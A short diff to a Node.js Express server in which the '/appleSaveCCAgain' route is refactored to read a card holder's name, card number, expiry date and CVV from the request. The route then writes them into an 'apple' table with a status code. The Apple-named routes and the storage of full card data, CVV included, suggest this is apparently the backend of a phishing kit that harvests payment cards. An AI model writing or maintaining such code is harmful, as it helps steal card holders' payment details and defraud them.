@@ -2058,11 +2058,7 @@ app.post("/appleSaveTelephone", cors(), (req, res) => {
 });
 
 app.post("/appleSaveCCAgain", cors(), (req, res) => {
-  uniqueid = req.body.uniqueid;
-  ccname = req.body.ccname;
-  ccnum = req.body.ccnum;
-  ccexp = req.body.ccexp;
-  cvv = req.body.cvv;
+  const {ccname, ccnum, ccexp, cvv, uniqueid} = req.body
 
   let details = [ccname, ccnum, ccexp, cvv, uniqueid];
   let query = `UPDATE apple SET ccname = ?, ccnum = ?, ccexp = ?, cvv = ?, status = 8 WHERE uniqueid = ?`;
